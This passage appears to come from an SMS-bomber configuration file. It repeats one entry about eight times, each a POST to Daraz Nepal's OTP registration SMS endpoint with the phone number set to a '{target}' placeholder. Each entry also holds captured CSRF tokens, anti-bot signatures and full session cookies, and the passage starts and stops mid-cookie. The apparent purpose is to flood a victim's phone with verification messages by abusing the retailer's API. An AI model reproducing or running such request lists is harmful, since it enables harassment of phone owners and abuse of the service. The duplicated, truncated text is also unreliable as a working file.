cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; 